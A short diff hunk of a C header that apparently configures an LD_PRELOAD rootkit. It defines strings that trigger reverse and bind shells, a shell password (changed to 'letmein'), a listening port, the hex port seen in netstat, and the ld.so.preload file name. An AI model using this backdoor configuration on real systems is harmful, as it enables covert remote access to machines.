@@ -15,7 +15,7 @@
 
 #define REVTRIGGER "plsrev" //  presence of this string will trigger the REV Shell
 #define BINDTRIGGER "plsbind" // presence of this string will trigger the BIND Shell
-#define PASS "th0u$h@lln0tp@$$" // password for shell access
+#define PASS "letmein" // password for shell access
 #define PORT "5555" // port to listen on / connect to
 #define HEXPORT "15B3" // hex value reflected in netstat
 #define FILENAME "ld.so.preload"
